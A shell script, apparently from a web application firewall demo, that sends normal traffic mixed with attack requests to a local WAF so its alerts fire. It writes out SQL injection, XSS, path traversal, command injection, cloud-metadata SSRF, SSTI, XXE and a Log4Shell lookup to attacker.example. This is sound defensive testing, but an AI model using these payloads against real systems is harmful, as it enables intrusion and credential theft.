#!/bin/sh
# SPDX-License-Identifier: Apache-2.0
# Demo traffic generator: a steady mix of normal requests and attacks, from a few made-up
# client addresses (documentation ranges, RFC 5737) sent as X-Forwarded-For. Every ~45 seconds
# one "scanner" bursts, so the alerts in the dashboard fire.

WAF_URL="${WAF_URL:-http://waf:8080}"

# Wait for the WAF to answer before starting.
until curl -s -o /dev/null "$WAF_URL/"; do sleep 1; done
echo "traffic: WAF is up, sending demo traffic to $WAF_URL"

CLIENTS="203.0.113.10 203.0.113.24 203.0.113.57 198.51.100.7 198.51.100.42 192.0.2.15 192.0.2.88"

pick_client() {
  n=$(( $(od -An -N2 -tu2 /dev/urandom) % 7 + 1 ))
  echo "$CLIENTS" | cut -d' ' -f"$n"
}

# send <client-ip> <curl args...>
send() {
  ip="$1"; shift
  code=$(curl -s -o /dev/null -w '%{http_code}' -H "X-Forwarded-For: $ip" "$@")
  echo "traffic: $ip $code $*" | cut -c1-160
}

normal() {
  ip=$(pick_client)
  case $(( $(od -An -N1 -tu1 /dev/urandom) % 6 )) in
    0) send "$ip" "$WAF_URL/" ;;
    1) send "$ip" "$WAF_URL/products?id=42&sort=price" ;;
    2) send "$ip" "$WAF_URL/search?q=running+shoes" ;;
    3) send "$ip" "$WAF_URL/api/users/7" -H "Accept: application/json" ;;
    4) send "$ip" -X POST "$WAF_URL/api/login" -H "Content-Type: application/json" \
         -d '{"username":"alice","password":"correct horse battery staple"}' ;;
    5) send "$ip" "$WAF_URL/static/app.css" ;;
  esac
}

attack() {
  ip=$(pick_client)
  case $(( $(od -An -N1 -tu1 /dev/urandom) % 12 )) in
    0) send "$ip" "$WAF_URL/products?id=1'%20OR%20'1'='1" ;;
    1) send "$ip" "$WAF_URL/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users--" ;;
    2) send "$ip" "$WAF_URL/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E" ;;
    3) send "$ip" "$WAF_URL/download?file=../../../../etc/passwd" ;;
    4) send "$ip" "$WAF_URL/ping?host=127.0.0.1;cat%20/etc/passwd" ;;
    5) send "$ip" "$WAF_URL/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" ;;
    6) send "$ip" "$WAF_URL/hello?name=%7B%7B7*7%7D%7D%7B%7Bconfig.__class__.__init__.__globals__%7D%7D" ;;
    7) send "$ip" "$WAF_URL/api/items" -H 'X-Api-Version: ${jndi:ldap://attacker.example/a}' ;;
    8) send "$ip" "$WAF_URL/" -A "sqlmap/1.8.4#stable (https://sqlmap.org)" ;;
    9) send "$ip" -X POST "$WAF_URL/api/login" -H "Content-Type: application/json" \
         -d '{"username":{"$ne":null},"password":{"$ne":null}}' ;;
    10) send "$ip" -X POST "$WAF_URL/api/import" -H "Content-Type: application/xml" \
         -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>' ;;
    11) send "$ip" -X POST "$WAF_URL/api/login" -H "Content-Type: application/json" \
         -H "Cookie: session=abc123" \
         -d '{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"hunter2"}' ;;
  esac
}

# A scanner-like burst from one address: enough blocks in a minute to fire the per-IP alert.
burst() {
  ip="198.51.100.66"
  for p in "/.env" "/.git/config" "/wp-login.php?user=admin'--" "/admin/../../etc/shadow" \
           "/?id=1;DROP%20TABLE%20users" "/cgi-bin/test.cgi?x=;id" "/?q=%3Csvg/onload=alert(1)%3E" \
           "/?file=php://filter/convert.base64-encode/resource=index.php" \
           "/?cmd=%60whoami%60" "/?url=file:///etc/passwd" "/?q=1%27%20AND%20SLEEP(5)--" \
           "/server-status?x=%3Cscript%3E"; do
    send "$ip" "$WAF_URL$p" -A "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"
  done
}

# Mostly normal traffic with an attack in each round (spread over the made-up clients, so no
# single one reaches the alert threshold), plus the scanner burst every ~45 seconds.
round=0
while true; do
  round=$((round + 1))
  normal; normal
  attack
  normal; normal
  if [ $((round % 20)) -eq 0 ]; then burst; fi
  sleep 2
done
